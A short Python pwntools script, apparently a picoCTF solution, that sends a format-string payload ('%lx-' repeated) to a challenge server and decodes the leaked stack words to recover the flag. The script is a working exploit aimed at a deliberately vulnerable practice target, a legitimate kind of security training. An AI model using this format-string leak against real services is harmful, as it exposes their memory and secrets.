from pwn import *
context.log_level = 'error'
# nc mimas.picoctf.net 52015
r = remote('mimas.picoctf.net', 52015)
r.sendlineafter(b':\n', b'%lx-'*20)
r.recvuntil(b'order: ')
l = [bytes.fromhex(i.rjust(16, '0'))[::-1] for i in r.recvline().decode().strip().split("-")]
print(b''.join(l))
r.close()
